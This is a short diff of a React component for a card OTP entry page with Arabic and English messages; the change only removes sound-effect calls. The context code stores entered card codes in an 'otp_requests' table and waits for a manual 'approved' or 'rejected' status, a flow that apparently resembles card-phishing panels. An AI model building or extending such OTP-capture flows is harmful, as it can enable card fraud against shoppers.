@@ -7,7 +7,7 @@ import Header from "@/components/Header";
 import Footer from "@/components/Footer";
 import { ShieldCheck, Lock, RefreshCw, CreditCard } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
-import { playChime } from "@/hooks/use-action-sound";
+
 
 const CardOTP = () => {
   const { lang } = useLanguage();
@@ -58,7 +58,7 @@ const CardOTP = () => {
         const newStatus = payload.new.status;
         if (newStatus === "approved") {
           setStatus("approved");
-          playChime("success");
+          
           if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 200]);
           setTimeout(() => {
             navigate("/order-confirmation", {
@@ -78,7 +78,7 @@ const CardOTP = () => {
           }, 2000);
         } else if (newStatus === "rejected") {
           setStatus("rejected");
-          playChime("error");
+          
           if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
           setShake(true);
           setTimeout(() => setShake(false), 600);
@@ -94,7 +94,7 @@ const CardOTP = () => {
     if (code.length < 4) {
       setShake(true);
       setTimeout(() => setShake(false), 600);
-      playChime("error");
+      
       toast({
         title: isAr ? "⚠️ أدخل الرمز كاملاً" : "⚠️ Enter complete code",
         variant: "destructive",
@@ -103,7 +103,7 @@ const CardOTP = () => {
     }
 
     setStatus("waiting");
-    playChime("notification");
+    
 
     const { data, error } = await (supabase as any)
       .from("otp_requests")
